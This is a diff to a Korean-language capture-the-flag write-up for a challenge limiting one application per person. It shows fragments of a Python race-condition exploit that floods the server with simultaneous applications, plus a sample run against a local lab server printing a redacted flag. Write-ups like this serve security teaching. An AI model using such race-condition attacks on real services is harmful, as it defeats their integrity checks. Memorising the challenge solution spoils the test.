@@ -108,8 +108,6 @@ apply_lock = threading.Lock()
 
 ## 7. 익스플로잇 코드
 
-같은 폴더의 [exploit.py](exploit.py) 와 같습니다.
-
 ```python
 #!/usr/bin/env python3
 # medium-05 (1인 1원서) - 중복 확인과 저장 사이의 틈에 신청서를 동시에 여러 장 보낸다
@@ -150,4 +148,12 @@ count = len(set(re.findall(r"/applications/(\d+)", page)))
 flag = re.search(r"GlassHouse\{[^}]*\}", page)
 print(f"[*] 내 신청서 {count}장")
 print(f"[+] FLAG: {flag.group(0)}" if flag else "[-] 실패. 다시 실행해 보십시오")
+```
+
+실행 예시
+
+```bash
+$ python3 exploit.py http://127.0.0.1:8005
+[*] 내 신청서 10장
+[+] FLAG: GlassHouse{...}
 ```
